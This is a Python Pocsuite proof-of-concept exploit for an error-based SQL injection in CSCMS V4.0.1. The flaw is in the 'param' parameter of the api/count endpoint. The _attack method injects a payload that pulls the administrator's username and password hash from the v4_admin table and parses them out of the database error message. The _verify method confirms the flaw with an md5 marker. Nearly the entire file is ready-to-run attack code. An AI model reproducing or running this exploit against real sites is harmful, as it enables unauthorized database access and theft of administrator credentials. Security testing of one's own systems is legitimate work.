#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import urlparse
import re

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Gump']
    vulDate = '2015-08-11'
    createDate = '2016-01-15'
    updateDate = '2016-01-15'
    references = ['http://www.wooyun.org/bugs/wooyun-2015-0113520']
    name = 'CSCMS V4.0.1 app/controllers/api/count.php SQL注入 POC'
    appPowerLink = 'http://www.chshcms.com/'
    appName = 'CSCMS'
    appVersion = '4.0.1'
    vulType = 'SQL Injection'
    desc = '''
    CSCMS在拼接sql语句的时候过滤不严，把param参数直接拼接到sql语句中导致sql注入，可以获得管理员账户和加密后的密码
    '''
    
    # 组件安装包下载地址：https://github.com/chshcms/CSCMS-v4.0-UTF8
    samples = ['']

    def _attack(self):
        result = {}
        payload = "?param=admin|(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(select/**/concat(char(45,45),adminname,char(45,45,45),adminpass,char(45,45))/**/from/**/v4_admin/**/limit/**/1))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)"
        vulurl = urlparse.urljoin(self.url,'index.php/api/count/index' + payload)
        head = {
            'Referer':'http://www.baidu.com'
        }
        resp = req.get(vulurl,headers=head)
        # 返回的是500状态码而不是一般的200
        if resp.status_code == 500:
            match_result = re.search(r'Duplicate entry \'1--(.+)---(.+)--\' for key',resp.content,re.I | re.M)
            if match_result:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = match_result.group(1)
                result['AdminInfo']['Password'] = match_result.group(2)
        return self.parse_output(result)

    def _verify(self):
        result = {}
        payload = "?param=admin|(select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),md5(1))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)"
        vulurl = urlparse.urljoin(self.url,'index.php/api/count/index' + payload)
        head = {
            'Referer':'http://www.baidu.com'
        }
        resp = req.get(vulurl,headers=head)
        # 返回的是500状态码而不是一般的200
        if resp.status_code == 500 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = urlparse.urljoin(self.url,'index.php/api/count/index')
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)